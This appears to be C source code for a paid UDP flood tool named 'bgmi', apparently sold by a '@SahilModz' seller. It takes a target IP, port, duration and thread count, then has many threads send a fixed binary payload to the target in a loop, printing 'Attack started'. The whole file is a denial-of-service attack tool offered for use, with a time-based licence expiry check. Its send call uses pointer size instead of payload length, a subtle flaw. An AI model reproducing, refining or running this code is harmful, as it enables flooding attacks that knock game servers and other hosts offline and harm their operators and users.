#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2025-10-01" // Set the expiration date (YYYY-MM-DD format)

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

// Function to check if the file has expired
int check_expiry() {
    struct tm expiry_time = {0};
    time_t current_time, expiry_timestamp;

    // Parse the expiration date
    if (strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_time) == NULL) {
        fprintf(stderr, "Error parsing expiration date\n");
        return 1;
    }

    // Convert expiration time to timestamp
    expiry_timestamp = mktime(&expiry_time);

    // Get the current time
    time(&current_time);

    // Compare current time with the expiry date
    if (difftime(expiry_timestamp, current_time) <= 0) {
        printf("THIS IS A PAID FILE BY @SAHILMODZOWNER EXPIRED ON %s.\n", EXPIRY_DATE);
        return 1;
    }

    return 0;  // Not expired
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    char *payloads[] = {
       "\x36\x5f\x1f\xa3\xbb\x7b\x7b\x1f\x7f\x46\x86\xf0\x17\xe1\x1d\xf4\x14\x50\x95\x84\x99\xad\xbe\xb1\x1d\x6b\x83\x70\x1c\x07\x15\xa6\xd2\x33\x47\x73\x4f\x6a\x01\x44\x0b\xa7\x58\xfd\xf7\x27\x2c\x16\xed\xd3\xcd\xf1\xeb\xeb\xb3\x52\xe1\xaa\x1b\x46\x45\xef\x0d\x49\x1b\x1f\x26\x1d\xd2\x3b\xd6\x64\x78\xc7\xd6\x36\x47\xa4\x89\xdc\x8a\xc5\x9b\xa1\x01\x9c\x3f\x78\xbc\x44\x6d\x30\x3f\x42\x49\xee\x5d\xf5\xa3\xe0\x1a\xa6\x79\x46\x5e\xad\x43\xdb\x0c\x81\x54\x2a\x04\x04\x31\x29\x49\xdf\xab\x6f\xa5\x3d\xb0\x34\xc2\x66\x4a\x3a\x3a\xe9\x65\x86\xbc\xd1\x0e\x10\x5b\xfc\xdf\x79\x62\x15\x64\x1e\x06\x82\xbc\x53\x9c\x0c\x99\xf2\x49\x56\xab\xfc\xb9\x4f\xd9\xfa"
        };

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Send packets for the specified duration
    time_t endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0,
                      (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Check if the file has expired
    if (check_expiry()) {
        exit(1);
    }

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Start attack threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *thread_data_copy = malloc(sizeof(struct thread_data));
        memcpy(thread_data_copy, &data, sizeof(struct thread_data));

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)thread_data_copy) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Join all attack threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished, join @SahilModz\n");
    return 0;
}